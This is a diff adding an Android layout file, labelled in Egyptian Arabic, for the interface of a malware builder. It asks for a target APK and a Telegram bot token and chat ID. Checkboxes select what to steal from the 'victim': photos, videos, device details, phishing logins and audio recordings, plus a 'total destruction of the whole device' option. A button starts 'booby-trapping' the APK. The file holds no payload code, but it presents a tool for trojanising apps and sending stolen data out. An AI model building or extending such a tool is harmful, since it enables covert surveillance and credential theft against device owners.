@@ -1,0 +1,156 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#050505"
+    android:padding="16dp">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical">
+
+        <!-- ترحيب إدمان -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="إدمان بيرحب بيك 🚀"
+            android:textColor="#00FF66"
+            android:textSize="26sp"
+            android:textStyle="bold"
+            android:gravity="center"
+            android:layout_marginBottom="20dp"
+            android:shadowColor="#00FF66"
+            android:shadowRadius="10"/>
+
+        <!-- اختيار ملف APK -->
+        <Button
+            android:id="@+id/btnSelectApk"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="📁 اختر تطبيق الهدف (APK)"
+            android:backgroundTint="#112211"
+            android:textColor="#00FF66"
+            android:textStyle="bold"
+            android:layout_marginBottom="12dp"/>
+
+        <TextView
+            android:id="@+id/txtSelectedPath"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="لم يتم اختيار أي تطبيق"
+            android:textColor="#888888"
+            android:textSize="12sp"
+            android:layout_marginBottom="16dp"/>
+
+        <!-- إعدادات بوت تيليجرام -->
+        <EditText
+            android:id="@+id/edtBotToken"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="أدخل Bot Token هنا"
+            android:textColor="#00FF66"
+            android:textColorHint="#444444"
+            android:backgroundTint="#00FF66"
+            android:layout_marginBottom="10dp"
+            android:padding="10dp"/>
+
+        <EditText
+            android:id="@+id/edtChatId"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="أدخل Chat ID هنا"
+            android:textColor="#00FF66"
+            android:textColorHint="#444444"
+            android:backgroundTint="#00FF66"
+            android:layout_marginBottom="20dp"
+            android:padding="10dp"/>
+
+        <!-- خيارات السحب المستهدفة -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="حدد صيد الضحية المطلوب:"
+            android:textColor="#00FF66"
+            android:textStyle="bold"
+            android:textSize="16sp"
+            android:layout_marginBottom="10dp"/>
+
+        <CheckBox
+            android:id="@+id/cbImages"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="📷 سحب الصور"
+            android:textColor="#00FF66"/>
+
+        <CheckBox
+            android:id="@+id/cbVideos"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🎥 سحب الفيديوهات"
+            android:textColor="#00FF66"/>
+
+        <CheckBox
+            android:id="@+id/cbDeviceInfo"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="📱 معلومات الجهاز (رامات، مساحة، بلوتوث)"
+            android:textColor="#00FF66"/>
+
+        <CheckBox
+            android:id="@+id/cbAccounts"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🔑 حسابات تصيد (Phishing/Logins)"
+            android:textColor="#00FF66"/>
+
+        <CheckBox
+            android:id="@+id/cbAudio"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🎵 سحب الأغاني والريكوردات الصوتية"
+            android:textColor="#00FF66"/>
+
+        <CheckBox
+            android:id="@+id/cbAll"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🔥 اختيار الكل (تدمير شامل لكل الجهاز)"
+            android:textColor="#FF0055"
+            android:textStyle="bold"
+            android:layout_marginTop="8dp"
+            android:layout_marginBottom="20dp"/>
+
+        <!-- زر الإنشاء -->
+        <Button
+            android:id="@+id/btnBuild"
+            android:layout_width="match_parent"
+            android:layout_height="55dp"
+            android:text="⚡ بدء التلغيم وإنشاء APK"
+            android:backgroundTint="#00FF66"
+            android:textColor="#000000"
+            android:textStyle="bold"
+            android:textSize="16sp"
+            android:layout_marginBottom="15dp"/>
+
+        <!-- شريط الانتظار -->
+        <ProgressBar
+            android:id="@+id/progressBar"
+            style="?android:attr/progressBarStyleHorizontal"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:indeterminate="true"
+            android:visibility="gone"
+            android:layout_marginBottom="15dp"/>
+
+        <TextView
+            android:id="@+id/txtStatus"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text=""
+            android:textColor="#00FF66"
+            android:gravity="center"
+            android:textSize="14sp"/>
+
+    </LinearLayout>
+</ScrollView>
